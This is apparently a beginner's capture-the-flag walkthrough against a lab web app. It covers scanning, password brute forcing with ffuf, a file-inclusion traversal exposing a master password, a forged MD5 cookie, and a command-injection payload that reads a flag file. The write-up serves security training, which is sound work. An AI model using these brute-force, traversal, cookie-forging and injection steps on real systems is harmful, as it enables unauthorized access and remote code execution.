
Beginner's Guide to My CTF Walkthrough: Exploiting Support Ops Platform
=====================
Capture the Flag (CTF) competitions are an exciting way to sharpen cybersecurity skills. In this walkthrough, I'll share the steps I took to exploit vulnerabilities in the Support Ops platform and achieve Remote Code Execution (RCE). Along the way, I'll explain the concepts behind each step so beginners can follow along and learn the methodology.

<img width="200" height="200" alt="support" src="https://github.com/user-attachments/assets/58655549-b527-49f2-9c30-cf3060a9d52c" />

🔎 Step 1: Network Reconnaissance
-------------------------------
```
nmap -sS -p- 10.48.174.202
```
- Used nmap with a SYN scan (-sS) to check all ports (-p-) on the target machine.

<img width="494" height="206" alt="support_0_nmap_port" src="https://github.com/user-attachments/assets/1e862fc0-8b78-4ce6-af70-b80c3c2500d0" />

🛠️ Step 2: Service Enumeration
---------------------------
```
nmap -sS -A -p 22,80 10.48.174.202
```
- Service enumeration digs deeper into specific ports
- Knowing the services and versions helps us identify vulnerabilities.

<img width="500" height="312" alt="support_0_nmap_service_enum" src="https://github.com/user-attachments/assets/2b672322-ee79-49ab-83f5-63887bf1306c" />

🌐 Step 3: Web Reconnaissance
------------------------------
```
Accessed: http://10.48.174.202/
```
<img width="863" height="341" alt="support_1_web_home" src="https://github.com/user-attachments/assets/cecade43-8660-4add-89c3-dfbf667c3416" />

- Found: A simple login page.
- Web recon involves exploring the application manually to understand its structure and functionality.

📂 Step 4: Directory Enumeration
-------------------------------
```
gobuster dir -u http://10.48.174.202/ -w /usr/share/wordlists/dirb/common.txt -z -x .php
```
<img width="495" height="397" alt="support_2_web_dir_enum" src="https://github.com/user-attachments/assets/d43d1c09-245e-41db-8d14-f770035fbd3a" />

- Directory brute forcing reveals hidden files and directories.
- Discovered important files like footer.php, api.php, config.php

🔑 Step 5: Bruteforce Login
----------------------------
```
ffuf -X POST -u http://10.48.174.202/index.php -d 'email=help@support.thm&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -b 'PHPSESSID=lgao6jrnvd5g9i88s5kh64tjvl' -H 'Content-Type:application/x-www-form-urlencoded' -fs 2678
```
<img width="943" height="348" alt="support_3_web_dashboard" src="https://github.com/user-attachments/assets/374e3442-bd01-4622-89ea-93243f14013a" />

- Brute forcing tries multiple passwords until one works.
- Successful login as support user.

🧩 Step 6: File Inclusion Vulnerability
---------------------------------
```
URL: http://10.48.174.202/footer.php?skin=default
```
Manipulated values:
../dashboard

<img width="854" height="332" alt="support_3_web_file_inclusion_dashboard" src="https://github.com/user-attachments/assets/cf18692f-f73e-4aad-b197-02dc4467d668" />

<img width="633" height="358" alt="support_3_web_file_inclusion_dashboard_code" src="https://github.com/user-attachments/assets/74b9eb85-3fd1-419f-909e-df23be00898d" />

../config

<img width="623" height="329" alt="support_3_web_file_inclusion_config_master_password" src="https://github.com/user-attachments/assets/aeaddff5-09fd-4e6f-b280-9ac953ae81f6" />

- Found master password in source code.
- Local File Inclusion (LFI) allows attackers to load unintended files.
 
🔐 Step 7: Session Hijacking
----------------------------
- Discovered internal endpoint: http://10.48.174.202/api.php?id=1
```
http://10.48.174.202/footer.php?skin=../api
```
<img width="935" height="323" alt="support_3_web_file_inclusion_access_api" src="https://github.com/user-attachments/assets/45058ba0-71de-4ddc-9b9c-5a6faeb396b7" />

<img width="337" height="202" alt="support_3_web_file_inclusion_access_api_viewsource" src="https://github.com/user-attachments/assets/b3e1994f-92b0-42ee-a3c1-852bf69d3b3b" />

- Blocked due to missing cookie condition: isITUser.

<img width="923" height="161" alt="support_3_web_cookie_false" src="https://github.com/user-attachments/assets/c20286f0-cddd-47ff-a8b1-658089d119ea" />

- Default cookie value: 68934a3e9455fa72420237eb05902327 (MD5 of "false").
- Generated MD5 of "true":
```
echo -n "true" | md5sum
b326b5062b2f0e69046810717534cb09
```
- Replaced cookie value → gained access to IT Support Admin API Panel.

<img width="917" height="332" alt="support_3_web_file_inclusion_feature_1" src="https://github.com/user-attachments/assets/63660c8c-bf45-4bfe-9085-6ad504d1479c" />

<img width="785" height="217" alt="support_3_web_file_inclusion_access_api_result" src="https://github.com/user-attachments/assets/11bb49f4-f571-49e0-b03b-66e6c30ca18e" />

🧾 Step 8: IDOR (Insecure Direct Object Reference)
-------------------------------------------
- Extracted email list:
specialadmin@support.thm
IT@support.thm
help@support.thm

- IDOR occurs when attackers can manipulate object identifiers to access unauthorized data.
- Used master password (after removing @ symbol) to log in as Admin.

<img width="922" height="342" alt="support_3_web_admin_flag" src="https://github.com/user-attachments/assets/afd33175-0f7d-4b80-8424-b48c43bd8e68" />

- Admin flag found
  
🏁 Step 9: Command Injection / RCE
------------------------------
- Found dropdown menu triggering AJAX calls.
- Inspected network requests in browser developer tools.
- Edit & resend the recent network request.
- Modified request body:
```
sys=date;cat /home/ubuntu/user.txt
```
<img width="922" height="368" alt="support_3_web_ubuntu_flag" src="https://github.com/user-attachments/assets/0966ad82-2a8c-4a83-9741-a05c46b45331" />

- Retrieved final flag.


📌 Key Recommendations for CTF Beginners
-------------------------
- Always start with recon: Use tools like nmap, gobuster, and manual browsing to map the attack surface.
- Take notes: Document every finding. Even small details (like cookies) can become critical later.
- Understand the concepts: Don't just run commands - learn what they do and why they matter.
- Think creatively: Vulnerabilities often require chaining multiple techniques (e.g., LFI → session hijack → IDOR -> RCE).
- Practice safe hacking: Only perform these steps in legal environments like CTFs or labs.
- Stay patient: CTFs are puzzles. Sometimes the solution is hidden in plain sight.
